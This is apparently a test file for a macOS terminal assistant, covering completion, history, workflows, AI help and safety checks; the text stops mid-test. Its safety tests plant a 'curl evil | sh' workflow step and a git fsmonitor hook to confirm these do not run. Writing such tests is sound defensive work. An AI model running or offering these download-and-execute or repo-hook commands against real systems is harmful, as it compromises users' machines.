import Foundation
import XCTest
@testable import AnserCore

final class LexerTests: XCTestCase {
    func testQuotesAndEscapes() {
        let t = ShellLexer.tokenize(#"git commit -m "hello world" it\'s 'a b'"#).filter { $0.kind == .word }.map(\.value)
        XCTAssertEqual(t, ["git", "commit", "-m", "hello world", "it's", "a b"])
    }

    func testOperatorsAndCommandPositions() {
        let toks = ShellLexer.tokenize("FOO=1 sudo ls -la | grep x && cd /tmp; echo hi > out.txt")
        let cmds = ShellLexer.commandPositions(toks).sorted().map { toks[$0].value }
        XCTAssertEqual(cmds, ["sudo", "ls", "grep", "cd", "echo"])
    }

    func testUnclosedQuote() {
        let last = ShellLexer.tokenize(#"echo "unterminated"#).last!
        XCTAssertEqual(last.openQuote, "\"")
        XCTAssertEqual(last.value, "unterminated")
    }

    func testEscape() {
        XCTAssertEqual(ShellLexer.escape("My File (1).txt"), #"My\ File\ \(1\).txt"#)
        XCTAssertEqual(ShellLexer.escape("~/a b"), #"~/a\ b"#)
        XCTAssertEqual(ShellLexer.escape("it's", insideQuote: "'"), #"it'\''s"#)
    }
}

final class ContextTests: XCTestCase {
    func ctx(_ line: String) -> CompletionContext { CompletionContext(line: line, cursor: line.utf16.count, cwd: "/") }

    func testCommandPosition() {
        XCTAssertTrue(ctx("gi").isCommandPosition)
        XCTAssertEqual(ctx("gi").prefix, "gi")
        XCTAssertTrue(ctx("ls | gr").isCommandPosition)
        XCTAssertTrue(ctx("sudo ").isCommandPosition)
        XCTAssertFalse(ctx("git ").isCommandPosition)
    }

    func testWordsAfterSudoAndPipe() {
        let c = ctx("cat x | sudo git checkout ma")
        XCTAssertEqual(c.words, ["git", "checkout"])
        XCTAssertEqual(c.prefix, "ma")
        XCTAssertFalse(c.isCommandPosition)
    }

    func testReplaceRangeExtendsPastCursor() {
        let line = "git chekout"
        let c = CompletionContext(line: line, cursor: 6, cwd: "/")
        XCTAssertEqual(c.prefix, "ch")
        XCTAssertEqual(c.replaceRange, 4..<11)
    }

    func testRedirect() {
        XCTAssertTrue(ctx("echo hi > ou").afterRedirect)
    }
}

final class FuzzyTests: XCTestCase {
    func testRanking() {
        let prefix = Fuzzy.match("che", "checkout")!.score
        let sub = Fuzzy.match("che", "cherry-pick")!.score
        let scattered = Fuzzy.match("cko", "checkout")!.score
        XCTAssertGreaterThan(prefix, scattered)
        XCTAssertGreaterThan(sub, scattered)
        XCTAssertNil(Fuzzy.match("xyz", "checkout"))
        XCTAssertEqual(Fuzzy.match("co", "checkout")?.positions.count, 2)
    }
}

final class HistoryTests: XCTestCase {
    var dir: URL!

    override func setUp() {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("ansertest-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDown() { try? FileManager.default.removeItem(at: dir) }

    func testZshExtendedHistory() {
        let raw = ": 1700000000:0;git status\n: 1700000100:2;echo one\\\ntwo\nls -la\n"
        let parsed = HistoryStore.parseZshHistory(Data(raw.utf8))
        XCTAssertEqual(parsed.map(\.0), ["git status", "echo one\ntwo", "ls -la"])
        XCTAssertEqual(parsed[0].1, Date(timeIntervalSince1970: 1_700_000_000))
    }

    func testZshMetafied() {
        // "é" is 0xC3 0xA9; zsh writes 0xA9 as 0x83 0x89 (0xA9 ^ 32).
        let bytes: [UInt8] = Array("echo ".utf8) + [0xC3, 0x83, 0x89] + [0x0A]
        XCTAssertEqual(HistoryStore.parseZshHistory(Data(bytes)).first?.0, "echo é")
    }

    func testRecordSuggestSearch() {
        let h = HistoryStore(path: dir.appendingPathComponent("h.sqlite").path)
        let a = h.recordStart(command: "git checkout main", cwd: "/repo", session: "s1")
        h.recordFinish(id: a, exitCode: 0, duration: 0.2)
        let b = h.recordStart(command: "git checkout feature/login", cwd: "/repo", session: "s1")
        h.recordFinish(id: b, exitCode: 1, duration: 0.1)
        h.recordStart(command: "git checkout main", cwd: "/repo", session: "s2")

        XCTAssertEqual(h.suggestion(forPrefix: "git ch", cwd: "/repo"), "git checkout main")
        XCTAssertEqual(h.recentCommands(withPrefix: "git").first, "git checkout main")
        XCTAssertEqual(h.search("feat", scope: .all).first?.0.command, "git checkout feature/login")
        XCTAssertEqual(h.search("", scope: .failed).map(\.0.command), ["git checkout feature/login"])
        XCTAssertEqual(Set(h.search("", scope: .session, session: "s1").map(\.0.command)), ["git checkout main", "git checkout feature/login"])

        // Persisted across reopen.
        let h2 = HistoryStore(path: dir.appendingPathComponent("h.sqlite").path)
        XCTAssertEqual(h2.commandCount, 2)
        h2.delete(command: "git checkout main")
        XCTAssertEqual(h2.commandCount, 1)
    }
}

final class HelpParserTests: XCTestCase {
    func testGNUStyle() {
        let help = """
        Usage: tool [OPTIONS]
          -a, --all              show everything
          -o, --output=FILE      write to FILE
              --color[=WHEN]     colorize
          -v                     verbose
        """
        let opts = HelpParser.parse(help)
        XCTAssertEqual(opts.map(\.names), [["-a", "--all"], ["-o", "--output"], ["--color"], ["-v"]])
        XCTAssertEqual(opts[0].description, "show everything")
        XCTAssertFalse(opts[1].args.isEmpty)
    }

    func testBSDManStyle() {
        let man = """
             -l      (The lowercase letter ``ell''.) List files in the long format.
             -a      Include directory entries whose names begin with a dot.
        """
        XCTAssertEqual(HelpParser.parse(man).map(\.names), [["-l"], ["-a"]])
    }
}

final class EngineTests: XCTestCase {
    var repo: URL!
    var engine: CompletionEngine!
    let env = ShellEnvironment(aliases: ["g": "git"])

    override func setUp() {
        repo = FileManager.default.temporaryDirectory.appendingPathComponent("anserrepo-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: repo.appendingPathComponent("src/My Folder"), withIntermediateDirectories: true)
        FileManager.default.createFile(atPath: repo.appendingPathComponent("README.md").path, contents: Data())
        let specs = SpecRegistry()
        specs.loadBuiltins()
        engine = CompletionEngine(specs: specs, history: nil)
    }

    override func tearDown() { try? FileManager.default.removeItem(at: repo) }

    func complete(_ line: String) async -> [Completion] {
        await engine.complete(CompletionContext(line: line, cursor: line.utf16.count, cwd: repo.path), env: env)
    }

    func testSubcommands() async {
        let r = await complete("git chec")
        XCTAssertEqual(r.first?.insert, "checkout")
        XCTAssertEqual(r.first?.kind, .subcommand)
    }

    func testAliasExpandsToSpec() async {
        let r = await complete("g sta")
        XCTAssertTrue(r.contains { $0.insert == "status" }, "\(r.map(\.insert))")
    }

    func testOptions() async {
        let r = await complete("git commit --am")
        XCTAssertEqual(r.first?.insert, "--amend")
    }

    func testNestedSubcommand() async {
        let r = await complete("git stash p")
        XCTAssertTrue(r.contains { $0.insert == "pop" } && r.contains { $0.insert == "push" })
    }

    func testFoldersForCd() async {
        let r = await complete("cd sr")
        XCTAssertEqual(r.first?.insert, "src/")
        XCTAssertFalse(r.first!.appendSpace)
        let inner = await complete("cd src/My")
        XCTAssertEqual(inner.first?.insert, #"src/My\ Folder/"#)
        let files = await complete("cd ")
        XCTAssertFalse(files.contains { $0.insert == "README.md" }, "cd should only offer folders")
    }

    func testGitBranchesFromRealRepo() async throws {
        func git(_ args: String) {
            let p = Process()
            p.executableURL = URL(fileURLWithPath: "/bin/sh")
            p.arguments = ["-c", "git -c user.email=t@t -c user.name=t \(args)"]
            p.currentDirectoryURL = repo
            p.standardOutput = FileHandle.nullDevice
            p.standardError = FileHandle.nullDevice
            try? p.run(); p.waitUntilExit()
        }
        git("init -q -b main")
        git("commit -q --allow-empty -m init")
        git("branch feature/login")
        let r = await complete("git checkout feat")
        XCTAssertEqual(r.first?.insert, "feature/login")
        XCTAssertEqual(r.first?.kind, .branch)
        let add = await complete("git add READ")
        XCTAssertEqual(add.first?.insert, "README.md")
    }

    func testOptionValue() async {
        let r = await complete("git log --since=1.w")
        XCTAssertEqual(r.first?.insert, "--since=1.week.ago")
    }
}

final class EventTests: XCTestCase {
    func testParse() {
        XCTAssertEqual(ShellEvent.parse("prompt\t1\t/tmp/a b"), .prompt(exitCode: 1, cwd: "/tmp/a b"))
        XCTAssertEqual(ShellEvent.parse("preexec\techo a\\tb\\nc \\\\x\t/"), .preexec(command: "echo a\tb\nc \\x", cwd: "/"))
        var lb = LineBuffer()
        XCTAssertEqual(lb.append(Data("hel".utf8)), [])
        XCTAssertEqual(lb.append(Data("lo\nwor".utf8)), ["hello"])
        XCTAssertEqual(lb.append(Data("ld\n".utf8)), ["world"])
    }

    func testAliasParsing() {
        let zsh = "ll='ls -la'\ng=git\n"
        XCTAssertEqual(ShellEnvironment.parseAliases(zsh), ["ll": "ls -la", "g": "git"])
        XCTAssertEqual(ShellEnvironment.parseAliases("alias ll='ls -la'"), ["ll": "ls -la"])
    }

    func testConfigKeyNormalize() {
        XCTAssertEqual(AnserConfig.normalizeKey("Shift+Cmd+K"), "shift+cmd+k")
        XCTAssertEqual(AnserConfig.normalizeKey("command+control+x"), "ctrl+cmd+x")
    }

    func testStarterConfigDecodes() throws {
        let c = try JSONDecoder().decode(AnserConfig.self, from: Data(AnserConfig.starterConfig.utf8))
        XCTAssertEqual(c.abbreviations["gst"], "git status")
        XCTAssertTrue(c.snippets.isEmpty, "examples live in the notebook now (Notebook.starter)")
        XCTAssertEqual(c.profiles.first?.badge, "PROD")
        XCTAssertNoThrow(try JSONDecoder().decode(CompletionSpec.self, from: Data(AnserConfig.starterSpec.utf8)))
    }
}

final class NewFeatureTests: XCTestCase {
    func testGlobAndHistoryIgnore() {
        XCTAssertTrue(AnserConfig.glob("*token=*", "export gh_token=abc"))
        XCTAssertFalse(AnserConfig.glob("*token=*", "git status"))
        XCTAssertTrue(AnserConfig.glob("ls ?", "ls a"))
        let c = AnserConfig()
        XCTAssertTrue(c.shouldIgnoreInHistory("curl -H 'Authorization: Bearer xyz' x"))
        XCTAssertTrue(c.shouldIgnoreInHistory("export AWS_SECRET_ACCESS_KEY=1"))
        XCTAssertFalse(c.shouldIgnoreInHistory("git push"))
    }

    func testLazySpecs() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("anserspecs-\(UUID().uuidString)")
        let fig = dir.appendingPathComponent("fig")
        try FileManager.default.createDirectory(at: fig, withIntermediateDirectories: true)
        try #"{"name":"deploy","description":"Ship it","subcommands":[{"name":"prod"}]}"#.write(to: fig.appendingPathComponent("deploy.json"), atomically: true, encoding: .utf8)
        try #"{"name":"git","description":"from fig","subcommands":[{"name":"figonly"}]}"#.write(to: fig.appendingPathComponent("git.json"), atomically: true, encoding: .utf8)
        try #"{"deploy":{"file":"deploy","description":"Ship it"},"git":{"file":"git","description":"from fig"}}"#.write(to: fig.appendingPathComponent("index.json"), atomically: true, encoding: .utf8)
        try #"{"name":"git","description":"curated","subcommands":[{"name":"status"}]}"#.write(to: dir.appendingPathComponent("git.json"), atomically: true, encoding: .utf8)
        let r = SpecRegistry()
        r.load(directory: dir)
        XCTAssertEqual(r.describe("deploy"), "Ship it")
        XCTAssertEqual(r.spec(for: "deploy")?.subcommands.first?.names, ["prod"])
        XCTAssertEqual(r.spec(for: "git")?.description, "curated", "hand-written specs win over imported ones")
        try? FileManager.default.removeItem(at: dir)
    }

    func testProgramName() {
        XCTAssertEqual(HistoryStore.programName("FOO=1 sudo vim x"), "vim")
        XCTAssertEqual(HistoryStore.programName("git status"), "git")
    }
}

final class HintTests: XCTestCase {
    let engine: CompletionEngine = {
        let r = SpecRegistry(); r.loadBuiltins()
        return CompletionEngine(specs: r, history: nil)
    }()
    func hint(_ line: String) -> CompletionEngine.Hint? {
        engine.hint(line: line, cursor: line.utf16.count, cwd: "/", env: ShellEnvironment(aliases: ["g": "git"]))
    }

    func testHints() {
        XCTAssertEqual(hint("git")?.detail, "Distributed version control")
        XCTAssertEqual(hint("git comm")?.title, "git")
        XCTAssertEqual(hint("git commit")?.title, "git commit")
        XCTAssertEqual(hint("git commit -m")?.title, "git commit -m, --message ‹message›")
        XCTAssertEqual(hint("git commit -m ")?.title, "git commit -m ‹message›")
        XCTAssertEqual(hint("g push ")?.title, "git push ‹remote›")
        XCTAssertEqual(hint("git stash pop ")?.title, "git stash pop ‹stash›")
        XCTAssertEqual(hint("cd")?.detail, "Change the current directory")
    }
}

final class AppearanceTests: XCTestCase {
    func testGhosttyLines() throws {
        let json = #"{"appearance":{"fontFamily":"JetBrains Mono","fontSize":14,"theme":"Dracula","backgroundOpacity":0.9,"cursorStyle":"bar","padding":10},"shellPrompt":"compact"}"#
        let c = try JSONDecoder().decode(AnserConfig.self, from: Data(json.utf8))
        XCTAssertEqual(c.appearance.ghosttyLines, [
            "font-family = \"\"", "font-family = JetBrains Mono", "font-size = 14.0", "theme = Dracula",
            "background-opacity = 0.9", "cursor-style = bar", "window-padding-x = 10", "window-padding-y = 8",
        ])
        XCTAssertEqual(c.shellPrompt, "compact")
        XCTAssertEqual(AnserConfig().shellPrompt, "hidden")
        let legacy = try JSONDecoder().decode(AnserConfig.self, from: Data(#"{"compactPrompt":true}"#.utf8))
        XCTAssertEqual(legacy.shellPrompt, "compact")
    }
}

final class DevHelperTests: XCTestCase {
    func testEditDistanceAndSuggestions() {
        XCTAssertEqual(CommandIndex.editDistance("gti", "git"), 1)
        XCTAssertEqual(CommandIndex.editDistance("dokcer", "docker"), 1)
        XCTAssertEqual(CommandIndex.editDistance("npn", "npm"), 1)
        let env = ShellEnvironment(path: ["/usr/bin", "/bin"], aliases: ["gst": "git status"])
        XCTAssertEqual(CommandIndex.shared.suggestions(for: "gti", env: env).first, "git")
        XCTAssertTrue(CommandIndex.shared.suggestions(for: "gts", env: env).contains("gst"))
        XCTAssertEqual(CommandIndex.shared.suggestions(for: "lss", env: env, frequency: ["ls": 50]).first, "ls")
    }

    func testGitStatusParse() {
        let out = " M Sources/a.swift\nM  README.md\n?? new file.txt\nR  old.txt -> renamed.txt\n"
        let c = GitChange.parse(out)
        XCTAssertEqual(c.map(\.path), ["Sources/a.swift", "README.md", "new file.txt", "renamed.txt"])
        XCTAssertEqual(c.map(\.summary), ["modified", "modified, staged", "new file", "renamed, staged"])
    }

    func testCommandSeparatorStripped() {
        let out = "a\nb\n── sneha@Mac-Pro · 22:09:15 ──────────\n"
        XCTAssertEqual(CommandSeparator.strip(out), "a\nb\n")
        XCTAssertEqual(CommandSeparator.strip("x\n┄┄ me@host · 01:02:03 ┄┄┄┄\n\n"), "x\n")
        XCTAssertEqual(CommandSeparator.strip("── not a separator\n"), "── not a separator\n")
        XCTAssertEqual(CommandSeparator.strip("── sneha@Mac · 22:09:15 ────\n"), "")
        // The shell prints just the label now; Anser draws the rest of the line.
        XCTAssertEqual(CommandSeparator.strip("out\n── sneha@Mac · 22:09:15 ──\n"), "out\n")
        XCTAssertTrue(CommandSeparator.isSeparator("┄┄ me@host · 01:02:03 ┄┄"))
        // Current form: just the indented label.
        XCTAssertEqual(CommandSeparator.strip("out\n   sneha@Mac · 22:09:15\n"), "out\n")
        XCTAssertFalse(CommandSeparator.isSeparator("   no time here"))
        XCTAssertFalse(CommandSeparator.isSeparator("sneha@Mac · 22:09:15"))
    }

    /// git's warnings land in the same output; they must not show up as files.
    func testGitStatusParseSkipsWarnings() {
        let out = "warning: could not open directory 'Pictures/Photos Library/': Operation not permitted\n M a.swift\nfatal: oops\n"
        XCTAssertEqual(GitChange.parse(out).map(\.path), ["a.swift"])
    }

    func testRecentDirectories() {
        let path = FileManager.default.temporaryDirectory.appendingPathComponent("qdirs-\(UUID().uuidString).sqlite").path
        let h = HistoryStore(path: path)
        for _ in 0..<5 { h.recordStart(command: "ls", cwd: "/often", session: nil) }
        h.recordStart(command: "ls", cwd: "/rare", session: nil, at: Date().addingTimeInterval(-86400 * 30))
        XCTAssertEqual(h.recentDirectories().map(\.path), ["/often", "/rare"])
        try? FileManager.default.removeItem(atPath: path)
    }
}

final class PathLinkTests: XCTestCase {
    func testParse() {
        XCTAssertEqual(PathLink.parse("src/app.swift:42:10"), PathLink(path: "src/app.swift", line: 42, column: 10))
        XCTAssertEqual(PathLink.parse("./main.go:7:"), PathLink(path: "./main.go", line: 7))
        XCTAssertEqual(PathLink.parse("Foo.kt(12,3)"), PathLink(path: "Foo.kt", line: 12, column: 3))
        XCTAssertEqual(PathLink.parse("'README.md',"), PathLink(path: "README.md"))
        XCTAssertNil(PathLink.parse("https://example.com/x"))
    }

    func testFindLineInText() {
        let text = "error: src/app.swift:42:10: expected '}'\n  File \"/tmp/x.py\", line 3, in <module>"
        XCTAssertEqual(PathLink.find(word: "src/app.swift", in: text), PathLink(path: "src/app.swift", line: 42, column: 10))
        XCTAssertEqual(PathLink.find(word: "/tmp/x.py", in: text), PathLink(path: "/tmp/x.py", line: 3))
    }

    func testResolveAndEditor() {
        let l = PathLink(path: "a/../b.txt", line: 5)
        XCTAssertEqual(l.resolved(cwd: "/repo"), "/repo/b.txt")
        XCTAssertEqual(l.editorCommand("/usr/local/bin/code", absolutePath: "/repo/b.txt"), ["/usr/local/bin/code", "-g", "/repo/b.txt:5:1"])
        XCTAssertEqual(l.editorCommand("nvim", absolutePath: "/repo/b.txt"), ["nvim", "+5", "/repo/b.txt"])
    }
}

final class Round3ConfigTests: XCTestCase {
    func testLigaturesAndBlocks() throws {
        let c = try JSONDecoder().decode(AnserConfig.self, from: Data(#"{"appearance":{"ligatures":false},"commandBlocks":false,"openFilesWith":"zed"}"#.utf8))
        XCTAssertTrue(c.appearance.ghosttyLines.contains("font-feature = -calt"))
        XCTAssertFalse(c.commandBlocks)
        XCTAssertEqual(c.openFilesWith, "zed")
        XCTAssertTrue(AnserConfig().commandBlocks)
        XCTAssertFalse(AnserConfig().appearance.ghosttyLines.contains { $0.contains("font-feature") })
    }
}

final class WorkflowTests: XCTestCase {
    func testParamsAndRender() throws {
        let json = #"{"name":"Deploy","steps":["docker build -t app:{{tag}} .","kubectl -n {{ns:staging}} rollout restart deploy/app"],"params":[{"name":"ns","options":["staging","qa"]}]}"#
        let w = try JSONDecoder().decode(Workflow.self, from: Data(json.utf8))
        XCTAssertEqual(w.allParams.map(\.name), ["tag", "ns"])
        XCTAssertEqual(w.allParams[1].default, "staging")
        XCTAssertEqual(w.allParams[1].options ?? [], ["staging", "qa"])
        XCTAssertEqual(w.render(["tag": "v1.2"]), "docker build -t app:v1.2 . && kubectl -n staging rollout restart deploy/app")
        XCTAssertEqual(w.render(["tag": "my tag", "ns": "qa"]), #"docker build -t app:my\ tag . && kubectl -n qa rollout restart deploy/app"#)
        var loose = w; loose.stopOnError = false
        XCTAssertTrue(loose.render(["tag": "x"]).contains(" . ; kubectl") || loose.render(["tag": "x"]).contains(" .; kubectl"))
    }

    func testSaveAndLoadProjectFirst() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("wf-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: root.appendingPathComponent(".git"), withIntermediateDirectories: true)
        let proj = WorkflowStore.projectDirectory(for: root.appendingPathComponent("src/deep").path)!
        XCTAssertEqual(proj.path, root.appendingPathComponent(".anser/workflows").path)
        let url = try WorkflowStore.save(Workflow(name: "Run Tests!", steps: ["swift test"]), to: proj)
        XCTAssertEqual(url.lastPathComponent, "run-tests.json")
        let again = try WorkflowStore.save(Workflow(name: "Run Tests!", steps: ["swift test -c release"]), to: proj)
        XCTAssertEqual(again.lastPathComponent, "run-tests-2.json")
        let loaded = WorkflowStore.load(cwd: root.path).filter { $0.source == .project }
        XCTAssertEqual(Set(loaded.compactMap(\.steps.first)), ["swift test", "swift test -c release"])
        try? FileManager.default.removeItem(at: root)
    }

    func testMarkdown() {
        let md = MarkdownExport.render(title: "Session", entries: [
            .init(command: "ls", cwd: NSHomeDirectory() + "/x", exitCode: 0, duration: 0.012, started: Date(), output: "a\nb"),
            .init(command: "false", cwd: "/tmp", exitCode: 1, duration: 1.5, started: Date(), output: ""),
            .init(command: "old", cwd: "/tmp", exitCode: 0, duration: nil, started: Date(), output: nil),
        ])
        XCTAssertTrue(md.contains("## ✓ `ls`"))
        XCTAssertTrue(md.contains("~/x · 12 ms"))
        XCTAssertTrue(md.contains("```\na\nb\n```"))
        XCTAssertTrue(md.contains("## ✗ `false`") && md.contains("exit 1") && md.contains("_(no output)_"))
        XCTAssertTrue(md.contains("no longer in the scrollback"))
    }
}

final class AIHelpTests: XCTestCase {
    func testBodyUsesDefaultModelAndFallback() {
        let b = AIHelp.body(prompt: "hi", effort: "low")
        XCTAssertEqual(b["model"] as? String, "claude-opus-5-5")
        XCTAssertEqual(b["fallbacks"] as? String, "default")
        XCTAssertEqual((b["output_config"] as? [String: String])?["effort"], "low")
        XCTAssertNil(b["thinking"])
        XCTAssertNil(b["temperature"])
    }

    func testParse() throws {
        let ok = #"{"model":"claude-opus-5-5","stop_reason":"end_turn","content":[{"type":"thinking","thinking":""},{"type":"text","text":"The port is busy.\n```sh\nlsof -ti tcp:3000 | xargs kill\n```\nThen:\n```bash\n$ npm start\n```\n```json\n{\"a\":1}\n```"}]}"#
        let a = try AIHelp.parse(status: 200, data: Data(ok.utf8))
        XCTAssertTrue(a.text.hasPrefix("The port is busy."))
        XCTAssertEqual(a.commands, ["lsof -ti tcp:3000 | xargs kill", "npm start"])
        let refusal = #"{"stop_reason":"refusal","stop_details":{"type":"refusal","category":"cyber"},"content":[]}"#
        XCTAssertThrowsError(try AIHelp.parse(status: 200, data: Data(refusal.utf8))) { XCTAssertEqual($0 as? AIHelp.AIError, .refused("cyber")) }
        let err = #"{"type":"error","error":{"type":"authentication_error","message":"invalid x-api-key"}}"#
        XCTAssertThrowsError(try AIHelp.parse(status: 401, data: Data(err.utf8))) { XCTAssertEqual($0 as? AIHelp.AIError, .http(401, "invalid x-api-key")) }
    }

    func testRedaction() {
        let s = "export OPENAI=sk-abcdefghijklmnopqrstuvwxyz123\ncurl -H 'Authorization: Bearer abc.def' x\npassword=hunter2 ok\nAKIAABCDEFGHIJKLMNOP"
        let r = AIHelp.redact(s)
        XCTAssertFalse(r.contains("hunter2") || r.contains("sk-abcdef") || r.contains("AKIAABCD") || r.contains("abc.def"), r)
        XCTAssertTrue(r.contains("ok"))
    }

    func testRequestWithFakeTransport() async throws {
        let captured = CapturedRequest()
        let ai = AIHelp(apiKey: { "test-key" }, transport: { req in
            captured.set(req)
            return (200, Data(#"{"stop_reason":"end_turn","content":[{"type":"text","text":"Use:\n```sh\ngit pull --rebase\n```"}]}"#.utf8))
        })
        let ctx = AIHelp.Context(shell: "zsh", os: "macOS", cwdName: "repo", gitBranch: "main")
        let a = try await ai.explainFailure(command: "git push", exitCode: 1, output: "rejected: fetch first\ntoken=abc123", context: ctx)
        XCTAssertEqual(a.commands, ["git pull --rebase"])
        let req = try XCTUnwrap(captured.get())
        XCTAssertEqual(req.value(forHTTPHeaderField: "x-api-key"), "test-key")
        XCTAssertEqual(req.value(forHTTPHeaderField: "anthropic-beta"), "server-side-fallback-2026-07-01")
        let body = String(data: req.httpBody ?? Data(), encoding: .utf8) ?? ""
        XCTAssertTrue(body.contains("rejected: fetch first") && !body.contains("abc123"))
        let noKey = AIHelp(apiKey: { nil })
        do { _ = try await noKey.generateCommand("x", context: ctx); XCTFail() } catch { XCTAssertEqual(error as? AIHelp.AIError, .noAPIKey) }
    }
}

final class CapturedRequest: @unchecked Sendable {
    private var req: URLRequest?
    private let lock = NSLock()
    func set(_ r: URLRequest) { lock.withLock { req = r } }
    func get() -> URLRequest? { lock.withLock { req } }
}

final class FolderIndexTests: XCTestCase {
    func testScanSkipsHeavyFolders() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("fi-\(UUID().uuidString)")
        for p in ["app/src/components", "app/node_modules/react", "app/.git/objects", "docs"] {
            try FileManager.default.createDirectory(at: root.appendingPathComponent(p), withIntermediateDirectories: true)
        }
        let found = FolderIndex.scan(roots: [(root.path, 4)]).map { String($0.dropFirst(root.path.count)) }
        XCTAssertTrue(found.contains("/app/src/components"))
        XCTAssertTrue(found.contains("/app/node_modules"), "listed, but not descended into")
        XCTAssertFalse(found.contains("/app/node_modules/react"))
        XCTAssertFalse(found.contains { $0.contains(".git") })
        try? FileManager.default.removeItem(at: root)
    }

    func testCdTargetsAndRanking() {
        let t = FolderIndex.cdTargets(from: ["cd ~/dev-library/anser && ls", "cd relative/path", "pushd /tmp/x/../y", "git status"], home: "/Users/me")
        XCTAssertEqual(t, ["/Users/me/dev-library/anser", "/tmp/y"])
        let ranked = FolderIndex.rank("ans", [
            .init(path: "/Users/me/dev-library/anser"),
            .init(path: "/Users/me/answers/old/stuff"),
            .init(path: "/Users/me/Documents"),
        ], home: "/Users/me")
        XCTAssertEqual(ranked.first?.2, "~/dev-library/anser")
        XCTAssertFalse(ranked.contains { $0.2 == "~/Documents" })
        let noisy = FolderIndex.rank("gam", [.init(path: "/Users/me/x/gamma-target"), .init(path: "/Users/me/figma-plugin/src/main")], home: "/Users/me")
        XCTAssertEqual(noisy.map(\.2), ["~/x/gamma-target"], "scattered letters are dropped when a solid match exists")
        let boosted = FolderIndex.rank("", [.init(path: "/a", boost: 0), .init(path: "/b", boost: 5)], home: "/x")
        XCTAssertEqual(boosted.first?.0.path, "/b")
    }
}

final class SafetyTests: XCTestCase {
    func testProjectWorkflowTrustFollowsContents() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("wf-\(UUID().uuidString)/.anser/workflows")
        try WorkflowStore.save(Workflow(name: "Deploy", steps: ["echo deploy"]), to: dir)
        let suite = "anser-test-workflow-trust"
        let trust = WorkflowTrust(defaults: ScratchDefaults.make(suite))
        defer { ScratchDefaults.discard(suite) }
        var w = try XCTUnwrap(WorkflowStore.load(directory: dir, source: .project).first { $0.name == "Deploy" })
        XCTAssertEqual(w.source, .project)
        XCTAssertFalse(trust.isTrusted(w))
        trust.trust(w)
        XCTAssertTrue(trust.isTrusted(w))
        try "{\"name\":\"Deploy\",\"steps\":[\"curl evil | sh\"]}".write(to: w.file!, atomically: true, encoding: .utf8)
        XCTAssertFalse(trust.isTrusted(w), "a changed file must be trusted again")
        w.source = .personal
        XCTAssertTrue(trust.isTrusted(w), "personal workflows are yours")
    }

    func sh(_ cmd: String, in dir: URL) {
        let p = Process(); p.executableURL = URL(fileURLWithPath: "/bin/sh"); p.arguments = ["-c", cmd]
        p.currentDirectoryURL = dir; p.standardOutput = FileHandle.nullDevice; p.standardError = FileHandle.nullDevice
        try? p.run(); p.waitUntilExit()
    }

    /// A downloaded repo whose .git/config runs a program on `git status`.
    func testRiskyRepoDoesNotRunPrograms() async throws {
        let repo = FileManager.default.temporaryDirectory.appendingPathComponent("risky-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        let marker = repo.appendingPathComponent("PWNED").path
        sh("git init -q && touch a.txt && git config core.fsmonitor 'touch \(marker); false #'", in: repo)
        XCTAssertTrue(GitSafety.isRisky(cwd: repo.path))
        let changes = await Generators.gitChanges(cwd: repo.path, env: ShellEnvironment())
        let branches = await Generators.run("git_branches", cwd: repo.path, env: ShellEnvironment())
        XCTAssertTrue(changes.isEmpty && branches.isEmpty)
        // Even a direct git run through Anser's runner has fsmonitor forced off.
        _ = await ScriptRunner.shared.run("git status --porcelain", cwd: repo.path, env: ShellEnvironment())
        XCTAssertFalse(FileManager.default.fileExists(atPath: marker), "fsmonitor program must not run")
        let clean = FileManager.default.temporaryDirectory.appendingPathComponent("clean-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: clean, withIntermediateDirectories: true)
        sh("git init -q", in: clean)
        XCTAssertFalse(GitSafety.isRisky(cwd: clean.path))
        // husky's hooks folder: Anser forces hooks off, so git checks stay on.
        let hooksMarker = clean.appendingPathComponent("HOOKED").path
        sh("mkdir -p .husky/_ && printf '#!/bin/sh\\ntouch \(hooksMarker)\\n' > .husky/_/post-checkout && chmod +x .husky/_/post-checkout && git config core.hooksPath .husky/_ && git -c user.name=t -c user.email=t@t commit -q --allow-empty --no-verify -m init", in: clean)
        XCTAssertFalse(GitSafety.isRisky(cwd: clean.path))
        let cleanBranches = await Generators.run("git_local_branches", cwd: clean.path, env: ShellEnvironment())
        XCTAssertFalse(cleanBranches.isEmpty, "branches listed in a repo with core.hooksPath")
        _ = await ScriptRunner.shared.run("git checkout -q -b other", cwd: clean.path, env: ShellEnvironment())
        XCTAssertFalse(FileManager.default.fileExists(atPath: hooksMarker), "hooks must not run for Anser's own git commands")
        try? FileManager.default.removeItem(at: repo); try? FileManager.default.removeItem(at: clean)
    }

    /// `git switch` suggestions: local branches, plus remote-only ones by the short name git accepts.
    func testSwitchBranchSuggestions() async throws {
        let base = FileManager.default.temporaryDirectory.appendingPathComponent("switch-\(UUID().uuidString)")
        let repo = base.appendingPathComponent("repo")
        try FileManager.default.createDirectory(at: repo, withIntermediateDirectories: true)
        sh("""
            git init -q -b main && git -c user.email=t@t -c user.name=t commit -q --allow-empty -m init \
            && git init -q --bare ../origin.git && git remote add origin ../origin.git \
            && git branch feature/x && git branch shared && git push -q origin main feature/x shared \
            && git branch -D feature/x
            """, in: repo)
        let names = await Generators.run("git_switch_branches", cwd: repo.path, env: ShellEnvironment()).map(\.name)
        XCTAssertTrue(names.contains("main") && names.contains("shared") && names.contains("feature/x"), "\(names)")
        XCTAssertFalse(names.contains { $0.hasPrefix("origin/") }, "\(names)")
        XCTAssertEqual(names.filter { $0 == "shared" }.count, 1)
        try? FileManager.default.removeItem(at: base)
    }

    func testOpenSafety() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("open-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir.appendingPathComponent("Evil.app"), withIntermediateDirectories: true)
        for f in ["run.command", "notes.txt", "pic.png"] { FileManager.default.createFile(atPath: dir.appendingPathComponent(f).path, contents: Data("x".utf8)) }
        let script = dir.appendingPathComponent("tool").path
